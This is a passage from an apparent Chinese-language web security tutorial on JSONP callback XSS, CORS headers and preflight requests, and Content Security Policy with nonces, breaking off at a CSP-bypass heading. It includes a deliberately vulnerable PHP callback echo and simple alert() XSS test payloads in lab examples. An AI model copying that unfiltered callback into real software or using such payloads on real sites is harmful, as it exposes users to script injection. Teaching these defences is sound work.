+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$callback</span>.(data));</span><br></pre></td></tr></table></figure>
+
+<p>这样子，认为 callback 是可信的，而攻击者完全可以将<code>alert(/xss/)</code>作为 callback 参数传递进去，这种问题有两种解决方案：</p>
+<p>第一种：严格定义<code>Content-Type: application/json</code>，这样的防御机制导致了浏览器不解析恶意插入的<code>XSS</code>代码，第二种：过滤 callback 以及<code>JSON</code>数据输出，这样的防御机制是比较传统的攻防思维，对输出点进行<code>xss</code>过滤</p>
+</li>
+</ol>
+<h3 id="WebSocket-简介"><a href="#WebSocket-简介" class="headerlink" title="WebSocket 简介"></a>WebSocket 简介</h3><p><code>WebSocket</code>是一种通信协议，使用<code>ws://</code>（非加密）和<code>wss://</code>（加密）作为协议前缀，该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信，为什么不实行同源政策？</p>
+<p>原因是<code>WebSocket</code>请求的头信息中有一个字段是<code>Origin</code>，表示该请求的请求源（origin），即发自哪个域名，正是因为有了<code>Origin</code>这个字段，所以<code>WebSocket</code>才没有实行同源政策，因为服务器可以根据这个字段，判断是否许可本次通信</p>
+<h3 id="CORS-详解"><a href="#CORS-详解" class="headerlink" title="CORS 详解"></a>CORS 详解</h3><p><code>CORS</code>是跨域资源共享（Cross-Origin Resource Sharing）的缩写，它允许浏览器向跨源服务器，发出<code>XMLHttpRequest</code>请求，从而克服了 AJAX 只能同源使用的限制，它是<code>W3C</code>标准，是跨源 AJAX 请求的根本解决方法</p>
+<p><code>CORS</code>请求大致和<code>ajax</code>请求类似，但是在 HTTP 头信息中加上了 Origin 字段表明请求来自哪个源，如果<code>orgin</code>是许可范围之内的话，服务器返回的响应会多出<code>Access-Control-Allow-*</code>的字段</p>
+<h4 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h4><p><strong>只要同时满足以下两大条件，就属于简单请求：</strong></p>
+<ol>
+<li>请求方法是以下三种方法之一：HEAD、GET、POST</li>
+<li>HTTP 的头信息不超出以下几种字段：Accept、Accept-Language、Content-Language、Last-Event-ID、Content-Type（只限于三个值<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code>）</li>
+</ol>
+<p>浏览器发现这次跨源 AJAX 请求是简单请求，就自动在头信息之中，添加一个 Origin 字段：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> /cors <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Origin</span>: <span class="attr">http</span>:<span class="comment">//api.b.com</span></span><br><span class="line"><span class="title class_">Host</span>: api.<span class="property">a</span>.<span class="property">com</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Origin 字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）</span></span><br><span class="line"><span class="comment">// 服务器根据这个值，决定是否同意这次请求</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>简单请求有三个重要的响应头：</strong></p>
+<ol>
+<li><p><strong><code>Access-Control-Allow-Origin</code></strong></p>
+<p>该字段是必须的，它的值要么是请求时 Origin 字段的值，要么是一个<code>*</code>，表示接受任意域名的请求</p>
+</li>
+<li><p><strong><code>Access-Control-Allow-Credentials</code></strong></p>
+<p>该字段可选，它的值是一个布尔值，表示是否允许发送 Cookie，默认情况下，Cookie 不包括在<code>CORS</code>请求之中，设为 true，即表示服务器明确许可，Cookie 可以包含在请求中，一起发给服务器，这个值也只能设为 true，如果服务器不要浏览器发送 Cookie，删除该字段即可</p>
+</li>
+<li><p><strong><code>Access-Control-Expose-Headers</code></strong></p>
+<p>该字段可选，<code>CORS</code>请求时，<code>XMLHttpRequest</code>对象的<code>getResponseHeader()</code>方法只能拿到 6 个基本字段：<code>Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma</code>，如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定，例如，<code>getResponseHeader(&#39;wintrysec&#39;)</code>可以返回<code>wintrysec</code>字段的值</p>
+</li>
+</ol>
+<p><strong>响应字段，可请求资源范围</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Origin</span>：*  <span class="comment">// 表示同意任意跨源请求</span></span><br></pre></td></tr></table></figure>
+
+<p>CORS 简单请求实例（同样是<code>www.learnjs.com</code>和<code>www.ctftest.com</code>，<code>www.learnjs.com</code>会使用 ajax 向<code>www.ctftest.com</code>发送一个跨域请求）<code>www.learnjs.com</code>目录<code>ajax</code>下的两个文件：</p>
+<p><code>index.html</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Learning JavaScript<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Welcome to Learning JavaScript! :-)<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;test-response-text&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;5&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span>&gt;</span>我是一个文本框<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;ajax.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>ajax.js</code>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">success</span>(<span class="params">text</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> textarea = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;test-response-text&#x27;</span>);</span><br><span class="line">    textarea.<span class="property">value</span> = text;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fail</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> textarea = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;test-response-text&#x27;</span>);</span><br><span class="line">    textarea.<span class="property">value</span> = <span class="string">&#x27;Error code: &#x27;</span> + code;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新建 XMLHttpRequest 对象</span></span><br><span class="line"><span class="keyword">var</span> request = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 状态发生变化时，函数被回调</span></span><br><span class="line">request.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 成功完成</span></span><br><span class="line">    <span class="keyword">if</span> (request.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="comment">// 判断响应结果</span></span><br><span class="line">        <span class="keyword">if</span> (request.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="comment">// 成功，通过 responseText 拿到响应的文本</span></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">success</span>(request.<span class="property">responseText</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 失败，根据响应码判断失败原因</span></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">fail</span>(request.<span class="property">status</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// HTTP 请求还在继续...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2 秒后执行 sendReq()</span></span><br><span class="line"><span class="built_in">setTimeout</span>(sendReq, <span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送请求</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sendReq</span>(<span class="params"></span>) &#123;</span><br><span class="line">    request.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://ctftest.com/api.php&#x27;</span>);</span><br><span class="line">    request.<span class="title function_">send</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>www.ctftest.com</code>根目录添加<code>api.php</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$ACAO</span> = <span class="string">&quot;Access-Control-Allow-Origin: http://learnjs.com&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="variable">$ACAO</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://learnjs.com/ajax/</code>就会发现成功地进行了跨域请求，如果更改<code>$ACAO</code>的值，就会请求失败，例如改为<code>Access-Control-Allow-Origin: http://learnjava.com</code>，浏览器就会返回错误：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access to XMLHttpRequest at &#x27;http://ctftest.com/api.php&#x27; from origin &#x27;http://learnjs.com&#x27; has been blocked by CORS policy: The &#x27;Access-Control-Allow-Origin&#x27; header has a value &#x27;http://learnjava.com&#x27; that is not equal to the supplied origin.</span><br></pre></td></tr></table></figure>
+
+<h4 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h4><p>即对服务器有特殊要求的请求，比如 PUT 方法，自定义 HTTP-HEAD 头部等，非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为预检请求，预检请求用 OPTIONS 方法询问服务器允许的方法</p>
+<p>预检请求的头信息包括两个特殊字段：</p>
+<ol>
+<li><strong><code>Access-Control-Request-Method</code></strong>：该字段是必须的，用来列出浏览器的<code>CORS</code>请求会用到哪些 HTTP 方法</li>
+<li><strong><code>Access-Control-Request-Headers</code></strong>：指定浏览器<code>CORS</code>请求会额外发送的<code>http</code>头部信息字段，多个字段用逗号分隔</li>
+</ol>
+<p>如果浏览器否定了预检请求，会返回一个正常的 HTTP 回应，但是没有任何<code>CORS</code>相关的头信息字段响应，服务器响应的其他<code>CORS</code>相关字段如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Methods</span>: <span class="variable constant_">GET</span>, <span class="variable constant_">POST</span>, <span class="variable constant_">PUT</span>    <span class="comment">// 服务器支持的所有跨域请求的方法</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Headers</span>: X-<span class="title class_">Custom</span>-<span class="title class_">Header</span>   <span class="comment">// 服务器支持的所有头信息字段</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Credentials</span>: <span class="literal">true</span>          <span class="comment">// 表示是否允许发送 Cookie</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Max</span>-<span class="title class_">Age</span>: <span class="number">1728000</span>                    <span class="comment">// 用来指定本次预检请求的有效期，单位为秒</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>实例，来自 <a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1022910821149312/1023022332902400">AJAX</a>：</p>
+<p>对于 PUT、DELETE 以及其他类型如<code>application/json</code>的 POST 请求，在发送 AJAX 请求之前，浏览器会先发送一个<code>OPTIONS</code>请求（称为 preflighted 请求）到这个 URL 上，询问目标服务器是否接受：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">OPTIONS</span> /path/to/resource <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: bar.<span class="property">com</span></span><br><span class="line"><span class="title class_">Origin</span>: <span class="attr">http</span>:<span class="comment">//my.com</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Request</span>-<span class="title class_">Method</span>: <span class="variable constant_">POST</span></span><br></pre></td></tr></table></figure>
+
+<p>服务器必须响应并明确指出允许的 Method：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">HTTP</span>/<span class="number">1.1</span> <span class="number">200</span> <span class="variable constant_">OK</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Origin</span>: <span class="attr">http</span>:<span class="comment">//my.com</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Methods</span>: <span class="variable constant_">POST</span>, <span class="variable constant_">GET</span>, <span class="variable constant_">PUT</span>, <span class="variable constant_">OPTIONS</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Max</span>-<span class="title class_">Age</span>: <span class="number">86400</span></span><br></pre></td></tr></table></figure>
+
+<p>浏览器确认服务器响应的<code>Access-Control-Allow-Methods</code>头确实包含将要发送的 AJAX 请求的 Method，才会继续发送 AJAX，否则，抛出一个错误，由于以<code>POST</code>、<code>PUT</code>方式传送 JSON 格式的数据在 REST 中很常见，所以要跨域正确处理<code>POST</code>和<code>PUT</code>请求，服务器端必须正确响应<code>OPTIONS</code>请求</p>
+</blockquote>
+<p>一旦服务器通过了预检请求，以后每次浏览器正常的<code>CORS</code>请求，就都跟简单请求一样，会有一个<code>Origin</code>头信息字段，服务器的回应，也都会有一个<code>Access-Control-Allow-Origin</code>头信息字段。<code>Github</code>上的一个 POC：<a target="_blank" rel="noopener" href="https://github.com/trustedsec/cors-poc">cors-poc</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server --cgi</span><br></pre></td></tr></table></figure>
+
+<h4 id="与-JSONP-的比较"><a href="#与-JSONP-的比较" class="headerlink" title="与 JSONP 的比较"></a>与 JSONP 的比较</h4><p><code>CORS</code>与<code>JSONP</code>的使用目的相同，但是比<code>JSONP</code>更强大，<code>JSONP</code>只支持 GET 请求，<code>CORS</code>支持所有类型的 HTTP 请求，<code>JSONP</code>的优势在于支持老式浏览器，以及可以向不支持<code>CORS</code>的网站请求数据</p>
+<h3 id="CSP-简介"><a href="#CSP-简介" class="headerlink" title="CSP 简介"></a>CSP 简介</h3><p>所谓<code>CSP</code>（Content Security Policy）即浏览器内容安全策略， 为了缓解部分跨站脚本问题，<code>CSP</code>的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制，有两种方法启用<code>CSP</code>：</p>
+<ol>
+<li><p>添加 HTTP 头信息；<br><code>Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org; child-src https:</code></p>
+</li>
+<li><p>使用<code>&lt;meta&gt;</code>标签</p>
+<p><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org; child-src https:&quot;&gt;</code></p>
+</li>
+</ol>
+<p>关于<code>SCP</code>的使用可以参考：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">内容安全策略 ( CSP )</a>，<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/default-src">CSP: default-src</a>，关于<code>CSP</code>各种限制选项参考：<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/21979782">Content Security Policy (CSP) 是什么？为什么它能抵御 XSS 攻击？</a>，CSP 的出现可以一定程度上的减少 XSS 的攻击，但不一定意味着 XSS 的消失，CSP 的实例：</p>
+<p>同样是<code>www.learnjs.com</code>和<code>www.ctftest.com</code>，<code>www.learnjs.com</code>的<code>csp</code>目录下的<code>index.html</code>文件：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 这里设置了 Content-Security-Policy --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;self&#x27;;frame-src &#x27;self&#x27;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSP<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;//player.bilibili.com/player.html?aid=70951224&amp;bvid=BV1EE411Z7J2&amp;cid=122934671&amp;page=1&quot;</span> <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">framespacing</span>=<span class="string">&quot;0&quot;</span> <span class="attr">allowfullscreen</span>=<span class="string">&quot;true&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&quot;xss!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://ctftest.com/api.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>http://ctftest.com/</code>根目录下的<code>api.js</code>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现这三个资源（iframe 标签、内联 JavaScript，跨域外联 JavaScript）都没有正常加载，因为：</p>
+<ol>
+<li><code>Content-Security-Policy</code>中设置<code>frame-src &#39;self&#39;</code>导致非当前域名的 iframe 加载失败（设置为<code>frame-src http://player.bilibili.com/</code>可避免）</li>
+<li>设置<code>script-src &#39;self&#39;</code>，禁止了内联 Js 代码执行（设置为<code>script-src &#39;unsafe-inline&#39;</code>可避免或者设置<code>nonce</code>）</li>
+<li><code>Content-Security-Policy</code>中设置<code>frame-src &#39;self&#39;</code>导致跨域外联 JavaScript 加载失败（设置为<code>script-src http://ctftest.com/</code>可避免）</li>
+</ol>
+<p>关于 nonce 的介绍：一段内联的 JavaScript 代码，有可能就是攻击者注入的，如果设置<code>script-src</code>，是禁止内联 Js 代码执行的，可以将 script-src 设置为 ‘unsafe-inline’  以允许内联 Js 执行</p>
+<p>为了使内联的 Js 更加安全，可以使用 nonce 属性。在 Header 设置一个随机字符串或者散列值，当它与 script 标签的 nonce 属性相匹配时，说明这段内联的 Js 是安全的，是可以执行的，反之就说明这段 Js 是危险的就不会执行，实例如下：</p>
+<p>同样是<code>www.learnjs.com</code>和<code>www.ctftest.com</code>，<code>www.learnjs.com</code>的<code>csp</code>目录下的<code>index.html</code>文件：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 这里设置了 Content-Security-Policy --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;nonce-abc&#x27; &#x27;self&#x27;;frame-src &#x27;self&#x27;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSP<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;//player.bilibili.com/player.html?aid=70951224&amp;bvid=BV1EE411Z7J2&amp;cid=122934671&amp;page=1&quot;</span> <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">framespacing</span>=<span class="string">&quot;0&quot;</span> <span class="attr">allowfullscreen</span>=<span class="string">&quot;true&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 内联的 Js 设置了 nonce 属性 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&quot;abc&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&quot;xss!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://learnjs.com/csp/</code>就可以发现内联的 JavaScript 执行了，如果改变 nonce 使其不一致，Js 就不会执行，浏览器也会报告错误，详见：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000037408890">「网络」CSP和Nonce</a></p>
+<h3 id="CSP-绕过"><a href="#CSP-绕过" class="headerlink" title="CSP 绕过"></a>CSP 绕过</h3><h4 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a><code>URL</code>跳转</h4><p>在<code>default-src none</code>（未设置的属性设置为默认值<code>none</code>）的情况下，可以使用 meta 标签实现跳转</p>
